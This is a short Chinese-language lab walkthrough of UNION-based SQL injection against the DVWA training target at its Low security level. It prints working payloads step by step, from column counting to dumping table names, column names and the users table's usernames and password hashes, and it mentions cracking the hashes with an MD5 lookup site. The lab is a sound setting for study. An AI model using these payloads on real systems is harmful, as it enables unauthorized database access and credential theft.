# 联合查询注入（UNION query SQL injection）
关键字：union select
联合查询注入是联合两个表进行注入攻击。两个表的字段要数要相同，不然会出现报错（这也是为什么前期会使用order by 来确定字段数的原因）。

## 1.1 实例 1（DVWA靶场 SQL injection、安全等级：Low）

1.判断是否存在注入：单引号判断，回显显示错误信息，同时分析得出结论是字符型注入。

2.判断字段数：回显显示未知，所以字段数因该少于3，同时是get方式请求，但我使用的是—方式注释，所以前文（11.4）说的不一定。Order by 2时回显正常，确定字段数为2

3.确定回显点：使用1' union select 1,2— 确定1显示在First name:位置，2显示在Surname:位置，同时出现两条数据，可以将1设置为-1，从而简化查询。

4.查询敏感信息：得到用户名为：root@localhost，数据库版本为：5.7.33-0ubuntu0.16.04.1，数据库名：dvwa


5.查询当前数据库有哪些表：使用：-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’dvwa’)— 得到当前数据库下有guestbook,users两个表

6.查询users表中的字段：使用：-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')— 得到users表中的字段为：user_id,first_name,last_name,user,password,avatar,last_login,failed_login。注意在payload中需要同时指定table_schema和table_name，即在哪个数据库中的哪个表，为了防止多个数据库存在同名表的情况。

7.查询表中数据：使用：-1' union select user,password from users— 查询得到用户信息。使用MD5解密得到密码。解密网站：https://www.cmd5.com/
